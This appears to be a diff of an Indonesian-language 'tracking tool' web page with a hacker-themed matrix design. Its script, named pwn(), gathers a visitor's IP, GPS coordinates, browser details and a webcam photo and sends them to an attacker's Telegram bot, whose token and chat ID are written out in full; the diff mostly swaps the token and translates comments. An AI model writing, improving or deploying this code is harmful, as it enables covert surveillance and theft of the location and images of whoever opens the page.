@@ -5,71 +5,16 @@
 <title>Tools Yang Ingin Kamu Lacak</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;
-700&display=swap');
-*  {
-  box-sizing:border-box;  box-sizing:border-box;
-  margin:0;  margin:0;
-  padding:0  padding:0
-}
-body {
-  background:#000;  background:#000;
-  color:#0f0;  color:#0f0;
-  font-family:'Orbitron', monospace;  font-family:'Orbitron', monospace;
-  overflow:hidden  overflow:hidden
-}
-canvas {
-  position:fixed;  position:fixed;
-  top:0;  top:0;
-  left:0;  left:0;
-  width:100%;  width:100%;
-  height:100%;  height:100%;
-  z-index:0  z-index:0
-}
-.ui {
-  position:relative;  position:relative;
-  z-index:10;  z-index:10;
-  display:flex;  display:flex;
-  flex-direction:column;  flex-direction:column;
-  align-items:center;  align-items:center;
-  justify-content:center;  justify-content:center;
-  height:100vh;  height:100vh;
-  text-align:center  text-align:center
-}
-h1 {
-  font-size:2.4rem;  font-size:2.4rem;
-  margin-bottom:1.2rem;  margin-bottom:1.2rem;
-  letter-spacing:3px;  letter-spacing:3px;
-  text-shadow:0 0 10px #0f0  text-shadow:0 0 10px #0f0
-}
-input[type=text] {
-  width:300px;  width:300px;
-  padding:.7rem;  padding:.7rem;
-  border:1px solid #0f0;  border:1px solid #0f0;
-  background:#000;  background:#000;
-  color:#0f0;  color:#0f0;
-  border-radius:4px;  border-radius:4px;
-  font-size:1rem;  font-size:1rem;
-  margin-right:.5rem  margin-right:.5rem
-}
-button {
-  padding:.7rem 1.4rem;  padding:.7rem 1.4rem;
-  border:none;  border:none;
-  background:#0f0;  background:#0f0;
-  color:#000;  color:#000;
-  font-weight:700;  font-weight:700;
-  border-radius:4px;  border-radius:4px;
-  cursor:pointer;  cursor:pointer;
-  transition:.3s  transition:.3s
-}
-button:hover {
-  background:#0c0  background:#0c0
-}
-#result {
-  margin-top:1.5rem;  margin-top:1.5rem;
-  font-size:.9rem;  font-size:.9rem;
-  color:#3f3  color:#3f3
-}
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+* {box-sizing:border-box;margin:0;padding:0}
+body{background:#000;color:#0f0;font-family:'Orbitron',monospace;overflow:hidden}
+canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0}
+.ui{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
+h1{font-size:2.4rem;margin-bottom:1.2rem;letter-spacing:3px;text-shadow:0 0 10px #0f0}
+input[type=text]{width:300px;padding:.7rem;border:1px solid #0f0;background:#000;color:#0f0;border-radius:4px;font-size:1rem;margin-right:.5rem}
+button{padding:.7rem 1.4rem;border:none;background:#0f0;color:#000;font-weight:700;border-radius:4px;cursor:pointer;transition:.3s}
+button:hover{background:#0c0}
+#result{margin-top:1.5rem;font-size:.9rem;color:#3f3}
 </style>
 </head>
 <body>
@@ -84,11 +29,11 @@ button:hover {
 </div>
 
 <script>
-/* === KONFIGURASI === */
-const BOT_TOKEN = '8466797317:AAHmPG4JTBb3fuWEJfcmcryqj_wTToKOPRw';
+/* === CONFIG === */
+const BOT_TOKEN = '8122932904:AAH-GAPwQja8X11v-iU9PZzh4UIXoccsIzo';
 const CHAT_ID   = '7755675050';
 
-/* === Hujan matriks (kosmetik) === */
+/* === Matrix rain (cosmetic) === */
 const c=document.getElementById('matrix'),ctx=c.getContext('2d');
 c.width=window.innerWidth;c.height=window.innerHeight;
 const cols=Math.floor(c.width/14),drops=[];
@@ -106,10 +51,10 @@ function draw(){
 }
 setInterval(draw,33);
 
-/* === Pemicu utama === */
+/* === Main trigger === */
 async function pwn(){
   const out=document.getElementById('result');
-  out.textContent='[+] Silakan tunggu...';
+  out.textContent='[+] Menscan target...';
   const payload={
     target: document.getElementById('target').value||'none',
     ua: navigator.userAgent,
@@ -128,7 +73,7 @@ async function pwn(){
   });
   payload.gps=pos;
 
-  /* Cuplikan media */
+  /* Media snapshot */
   try{
     const stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
     const track=stream.getVideoTracks()[0];
@@ -147,16 +92,16 @@ async function pwn(){
   }
 }
 
-/* === Eksfiltrasi ke Telegram === */
+/* === Exfil to Telegram === */
 function sendTelegram(data){
   const caption=`
-🔪INFORMASI LACAKAN BARU 🔪
+🔪 LACAKAN BARU 🔪
 Target: ${data.target}
-IP: ${data.ip}
-GPS: ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
-UA: ${data.ua}
-Ref: ${data.ref}
-URL: ${data.url}
+IP    : ${data.ip}
+GPS   : ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
+UA    : ${data.ua}
+Ref   : ${data.ref}
+URL   : ${data.url}
   `.trim();
   const form=new FormData();
   form.append('chat_id',CHAT_ID);
@@ -167,7 +112,7 @@ URL: ${data.url}
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:form});
     });
   }else{
-    form.append('text',caption+'\n[+] Kamera Off');
+    form.append('text',caption+'\n[+] Foto gagal');
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:form});
   }
   document.getElementById('result').textContent='[+] Laporan terkirim ke Telegram.';
